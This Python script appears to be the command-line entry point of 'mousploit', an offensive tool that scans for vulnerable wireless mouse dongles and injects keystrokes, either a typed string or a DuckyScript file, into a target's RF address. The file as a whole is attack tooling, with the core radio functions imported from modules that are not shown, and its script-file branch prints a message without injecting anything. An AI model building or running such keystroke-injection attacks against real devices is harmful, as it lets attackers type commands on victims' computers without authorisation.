import argparse
import sys
from os.path import dirname

sys.path.append(dirname(dirname(__file__)))
from main_app.radio_server import *
from utils.general_utils import *

"""
usage: mousploit.py [-h] {attack,scan} ...

options:
  -h, --help     show this help message and exit

required commands:
  {attack,scan}  Select one of:
    attack       Perform a keystroke injection attack against a specified target
    scan         Scan for nearby vulnerable devices

commands usage:
usage: mousploit.py attack [-h] --address ADDRESS (--string STRING | --script-file SCRIPT_FILE)
usage: mousploit.py scan [-h] --duration DURATION
"""
def main():
    # initializing the argument parser
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)

    # adding two commands
    subparser = parser.add_subparsers(dest="command", title="required commands", help="Select one of:") # command can either be "attack" or "scan"
    attack_cmd = subparser.add_parser("attack", help="Perform a keystroke injection attack against a specified target")
    scan_cmd = subparser.add_parser("scan", help="Scan for nearby vulnerable devices")
    parser.epilog = f"""commands usage:\n{attack_cmd.format_usage()}{scan_cmd.format_usage()}""" # text added to the end of the help message (shown when using -h or calling parser.print_help())

    # defining arguments for "attack"
    attack_cmd.add_argument("--address", type=str, required=False, default="E4:ED:AE:B8:B4", help="RF address of a vulnerable device")
    group = attack_cmd.add_mutually_exclusive_group(required=True) # either a string or a script file path must be specified, but not both
    group.add_argument("--string", type=str, help="A string of characters to be injected into the target")
    group.add_argument("--script-file", type=str, help="Path of a DuckyScript file")

    # arguments for scan
    scan_cmd.add_argument("--duration", type=int, required=False, default=20, help="Duration of the scanning process (in seconds)")

    # parse the arguments
    args = parser.parse_args()

    # initialize the radio server
    radio_server = RadioServer("0.0.0.0", 5000) # 0.0.0.0 means listen on all network interfaces, this way we don't need to change the IP in this line every time we run the server on a different computer

    if args.command == "attack":
        channel = find_frequency_channel(radio_server, address_str_to_bytes(args.address))
        if not channel:
            print("Failed to find frequency channel. Tell the agent to try getting closer to the victim dongle.")
            sys.exit(1)

        if args.string:
            print(f"Injecting the string: {args.string} into target address: {args.address}")
            transmit_string(radio_server, args.string)
        elif args.script_file:
            print(f"Injecting the DuckyScript at: {args.script_file} into target address: {args.address}")
            
    elif args.command == "scan":
        print(f"Scanning for {args.duration} seconds...")
        scan(radio_server, args.duration)

if __name__ == "__main__":
    main()
